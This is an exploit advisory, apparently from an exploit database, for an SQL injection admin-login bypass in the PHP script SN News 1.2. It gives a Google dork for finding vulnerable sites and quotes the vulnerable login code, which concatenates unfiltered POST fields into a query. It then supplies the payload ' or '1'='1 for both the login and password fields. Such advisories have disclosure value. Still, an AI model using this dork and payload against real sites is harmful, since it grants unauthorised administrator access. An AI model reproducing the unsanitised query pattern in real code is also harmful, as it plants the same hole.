@@ -1,0 +1,36 @@
+##############################################################################
+## SN News <= 1.2 (/admin/loger.php) Admin Bypass Remote SQL Injection Vulnerability
+## Google Dork: "snews/visualiza.php?id="
+## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
+## Date: 06/06/2012
+## Version: 1.2
+## Software Link: http://phpbrasil.com/script/JHnpFRmSBqlf/sn-news
+## ISRAEL
+##############################################################################
+##          Author will be not responsible for any damage.
+##############################################################################
+## Vulnerable Code - /admin/logar.php [4-15]:
+4.$login = $_POST["login"];
+5.$senha = $_POST["senha"];
+6.$sql   = "select * from news_adm where login='$login' AND senha='$senha'";
+7.$query = mysql_query($sql);
+8.$nr    = mysql_num_rows($query);
+9.if($nr>0){
+10.$_SESSION["admin"] = "on";
+11.echo "<script>
+12.location.href='../'
+13.</script>
+14.";
+15.}
+## NOTE:
+## As you can see there is no validation or any filter to variables $login and $senha.
+## See line 6, so you can inject sql query by using $login and $senha variables.
+## SQL Injection PoC:
+## http://127.0.0.1/sn_news/admin/login.htm
+## Login: ' or '1'='1
+## Senha: ' or '1'='1
+## This injection will bypass the admin login screen.
+##############################################################################
+# Cya :)
+# 0x31337.net
+##############################################################################
